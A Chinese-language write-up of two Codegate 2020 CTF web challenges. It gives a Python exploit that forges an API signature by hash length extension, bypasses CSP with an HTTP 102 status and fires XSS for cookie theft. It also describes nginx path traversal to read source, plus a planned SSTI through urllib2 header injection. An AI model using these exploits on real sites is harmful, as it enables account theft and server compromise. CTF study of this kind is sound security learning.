
# 2020 Codegate Web题解


                                阅读量   
                                **707116**
                            
                        |
                        
                                                                                                                                    ![](./img/198479/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/198479/t0155c12ac2127803ef.jpg)](./img/198479/t0155c12ac2127803ef.jpg)



Codegate 还是有很多国际强队参加的，这里记录 Codegate 的两道 Web题。



## CSP

### <a class="reference-link" name="%E5%88%86%E6%9E%90"></a>分析

题目给了 api.php 的代码：

```
&lt;?php
require_once 'config.php';

if(!isset($_GET["q"]) || !isset($_GET["sig"])) {
    die("?");
}

$api_string = base64_decode($_GET["q"]);
$sig = $_GET["sig"];

if(md5($salt.$api_string) !== $sig){
    die("??");
}

//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...
$apis = explode("|", $api_string);
foreach($apis as $s) {
    $info = explode(",", $s);
    if(count($info) != 3)
        continue;
    $n = base64_decode($info[0]);
    $p1 = base64_decode($info[1]);
    $p2 = base64_decode($info[2]);

    if ($n === "header") {
        if(strlen($p1) &gt; 10)
            continue;
        if(strpos($p1.$p2, ":") !== false || strpos($p1.$p2, "-") !== false) //Don't trick...
            continue;
        header("$p1: $p2");
    }
    elseif ($n === "cookie") {
        setcookie($p1, $p2);
    }
    elseif ($n === "body") {
        if(preg_match("/&lt;.*&gt;/", $p1))
            continue;
        echo $p1;
        echo "n&lt;br /&gt;n";
    }
    elseif ($n === "hello") {
        echo "Hello, World!n";
    }
}
```

题目的 CSP 的策略是 `default-src 'self'; script-src 'none'; base-uri 'none';`，这基本给堵死了，直接打 cookie 不可能了。

index.php 可以给一个API，得到签名，但是不支持一次多个API，我们没有 key，这里明显是一个哈希长度扩展攻击的考点，采用 `salt+msg`的方式进行哈希。

接着 api.php，发现可以设置 header，设置 cookie，输出内容。设置 header做了一定过滤，无法覆盖 CSP 设置。body 这部分过滤没啥用，preg_match 的 . 不匹配 n。

关键在于使 CSP 失效，可以设置 HTTP 状态码为 102 使 CSP 失效，同时可以执行js。为了验证我本地写了个 php：

```
&lt;?php
header("Content-Security-Policy: default-src 'self'; script-src 'none';");
header("HTTP/: 102");
?&gt;

&lt;script&gt;alert(1)&lt;/script&gt;
```

我用 nimmis/apache-php7 这个镜像起了个 docker，发现 chrome 是不可以的：

[![](./img/198479/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_458_/t010655a47784b6fab6.png)

开始以为 chrome 版本问题，试了旧版本还是不行。

我用 mac 自带的 apache 和 php 环境试了一下，发现是可以的。。。

[![](./img/198479/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_175_/t0116204b1980663057.png)

这与 server 还有关系？感兴趣的师傅可以研究解答一下…

这道题的环境也是可以的，我们随便拿到一个签名，然后用哈希扩展攻击得到想要的签名。

### <a class="reference-link" name="exp"></a>exp

```
import requests
import hashpumpy

url = "http://110.10.147.166/"


def get_sig():
    res = requests.get(url + "view.php", params={'name': 'gml', 'p1': 'gml', 'p2': 'gml'}).content
    sig, msg = res.split("/api.php?sig=")[1].split('"&gt;&lt;/iframe&gt;')[0].split("&amp;q=")
    return sig, msg.decode("base64")


sig, msg = get_sig()

api1 = ['header', 'HTTP/', '102']
api2 = ['body', '&lt;scriptn&gt;alert(1)&lt;/scriptn&gt;', '']

new_msg = "|%s|%s" % (
    ','.join(c.encode("base64").strip() for c in api1), ','.join(c.encode("base64").strip() for c in api2))

# len(salt)=12
new_sig, q = hashpumpy.hashpump(sig, msg, new_msg, 12)
q = q.encode("base64")
print('{}api.php?sig={}&amp;q={}'.format(url, new_sig, q))
```

访问，发现可以弹窗：

[![](./img/198479/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_192_/t010bea6af1dd8f4b77.png)

改变 xss payload 为打 cookie的，提交给 bot，可以打到cookie：

[![](./img/198479/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_164_/t01bdeafff46db1ffaa.png)



## Render

### <a class="reference-link" name="Description"></a>Description

```
It is my first flask project with nginx. Write your own message, and get flag!

http://110.10.147.169/renderer/ 
http://58.229.253.144/renderer/

DOWNLOAD : http://ctf.codegate.org/099ef54feeff0c4e7c2e4c7dfd7deb6e/022fd23aa5d26fbeea4ea890710178e9
```

下载可以得到 settings/run.sh：

```
#!/bin/bash

service nginx stop
mv /etc/nginx/sites-enabled/default /tmp/
mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask

service nginx restart

uwsgi /home/src/uwsgi.ini &amp;
/bin/bash /home/cleaner.sh &amp;

/bin/bash
```

以及 docker file:

```
FROM python:2.7.16

ENV FLAG CODEGATE2020{**DELETED**}

RUN apt-get update
RUN apt-get install -y nginx
RUN pip install flask uwsgi

ADD prob_src/src /home/src
ADD settings/nginx-flask.conf /tmp/nginx-flask.conf

ADD prob_src/static /home/static
RUN chmod 777 /home/static

RUN mkdir /home/tickets
RUN chmod 777 /home/tickets

ADD settings/run.sh /home/run.sh
RUN chmod +x /home/run.sh

ADD settings/cleaner.sh /home/cleaner.sh
RUN chmod +x /home/cleaner.sh

CMD ["/bin/bash", "/home/run.sh"]
```

我们能从中得到的主要是目录结构，结合题目描述 nginx，应该存在 nginx 目录遍历。

`http://110.10.147.169/static../src/uwsgi.ini`，可以下到文件。

### <a class="reference-link" name="%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81"></a>获取源码

读源码：

`http://110.10.147.169/static../src/app/__init__.py`：

```
from flask import Flask
from app import routes
import os

app = Flask(__name__)
app.url_map.strict_slashes = False
app.register_blueprint(routes.front, url_prefix="/renderer")
app.config["FLAG"] = os.getenv("FLAG", "CODEGATE2020{}")
```

读routes：

`http://110.10.147.169/static../src/app/routes.py`

```
from flask import Flask, render_template, render_template_string, request, redirect, abort, Blueprint
import urllib2
import time
import hashlib

from os import path
from urlparse import urlparse

front = Blueprint("renderer", __name__)

@front.before_request
def test():
    print(request.url)

@front.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")

    url = request.form.get("url")
    res = proxy_read(url) if url else False
    if not res:
        abort(400)

    return render_template("index.html", data = res)

@front.route("/whatismyip", methods=["GET"])
def ipcheck():
    return render_template("ip.html", ip = get_ip(), real_ip = get_real_ip())

@front.route("/admin", methods=["GET"])
def admin_access():
    ip = get_ip()
    rip = get_real_ip()

    if ip not in ["127.0.0.1", "127.0.0.2"]: #super private ip :)
        abort(403)

    if ip != rip: #if use proxy
        ticket = write_log(rip)
        return render_template("admin_remote.html", ticket = ticket)

    else:
        if ip == "127.0.0.2" and request.args.get("body"):
            ticket = write_extend_log(rip, request.args.get("body"))
            return render_template("admin_local.html", ticket = ticket)
        else:
            return render_template("admin_local.html", ticket = None)

@front.route("/admin/ticket", methods=["GET"])
def admin_ticket():
    ip = get_ip()
    rip = get_real_ip()

    if ip != rip: #proxy doesn't allow to show ticket
        print 1
        abort(403)
    if ip not in ["127.0.0.1", "127.0.0.2"]: #only local
        print 2
        abort(403)
    if request.headers.get("User-Agent") != "AdminBrowser/1.337":
        print request.headers.get("User-Agent")
        abort(403)

    if request.args.get("ticket"):
        log = read_log(request.args.get("ticket"))
        if not log:
            print 4
            abort(403)
        return render_template_string(log)

def get_ip():
    return request.remote_addr

def get_real_ip():
    return request.headers.get("X-Forwarded-For") or get_ip()

def proxy_read(url):
    #TODO : implement logging

    s = urlparse(url).scheme
    if s not in ["http", "https"]: #sjgdmfRk akfRk
        return ""

    return urllib2.urlopen(url).read()

def write_log(rip):
    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
    with open("/home/tickets/%s" % tid, "w") as f:
        log_str = "Admin page accessed from %s" % rip
        f.write(log_str)

    return tid

def write_extend_log(rip, body):
    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
    with open("/home/tickets/%s" % tid, "w") as f:
        f.write(body)

    return tid

def read_log(ticket):
    if not (ticket and ticket.isalnum()):
        return False

    if path.exists("/home/tickets/%s" % ticket):
        with open("/home/tickets/%s" % ticket, "r") as f:
            return f.read()
    else:
        return False
```

### <a class="reference-link" name="%E5%88%86%E6%9E%90"></a>分析

可以发现我们 flag 在 config 中，想到 SSTI。

题目还提供了一个类似 SSRF 的功能，让服务器帮我们去请求，这里用的是 `urllib2.urlopen(url)`，这里存在 http 头注入的问题。

再看一下 admin 接口，会把 rip，也就是 xff 头写到日志里，我们可以通过 /admin/ticket 接口来访问日志（当然我们有了目录遍历，也可以直接下载）

如何才能 SSTI 呢，当访问 /admin/ticket 接口时会把日志结果用 `render_template_string`渲染，所以我们的思路很清楚了：把 SSTI payload 先放到 xff 头里，访问 admin 接口把 payload 写到日志里，再去访问 /admin/ticket 接口实现 SSTI，头部控制可以利用 urllib 的 HTTP 注入。

### <a class="reference-link" name="exp"></a>exp

首先请求 /admin:

[![](./img/198479/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_375_/t0174be9e191f917388.png)

得到 ticket，再请求 /admin/ticket：

[![](./img/198479/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_546_/t01e16e3284102a3d77.png)
